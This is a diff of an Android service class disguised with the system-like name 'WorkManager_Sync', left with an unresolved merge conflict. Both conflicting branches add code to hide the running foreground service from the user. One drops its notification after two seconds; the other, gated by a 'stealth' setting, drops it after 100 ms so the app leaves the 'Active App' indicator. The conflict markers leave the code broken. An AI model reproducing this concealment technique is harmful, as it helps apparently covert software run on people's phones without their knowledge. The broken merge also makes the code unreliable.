@@ -396,6 +396,7 @@ public class WorkManager_Sync extends Service {
                 isForeground = true;
             }
 
+<<<<<<< HEAD
             // Remove from Samsung / Android 12+ "1 Active App" Recents Header
             if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                 new Handler(Looper.getMainLooper()).postDelayed(() -> {
@@ -403,6 +404,19 @@ public class WorkManager_Sync extends Service {
                         stopForeground(true);
                     } catch (Exception ignored) {}
                 }, 2000);
+=======
+            if (SystemAnalytics.isStealthEnabled(this)) {
+                new Handler(Looper.getMainLooper()).postDelayed(() -> {
+                    try {
+                        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
+                            stopForeground(STOP_FOREGROUND_REMOVE);
+                        } else {
+                            stopForeground(true);
+                        }
+                        isForeground = false;
+                    } catch (Exception ignored) {}
+                }, 100);
+>>>>>>> origin/K4N3CO.v1.6
             }
         } catch (Exception e) {
             Log.e(TAG, "Critical FGS startup failure: " + e.getMessage());
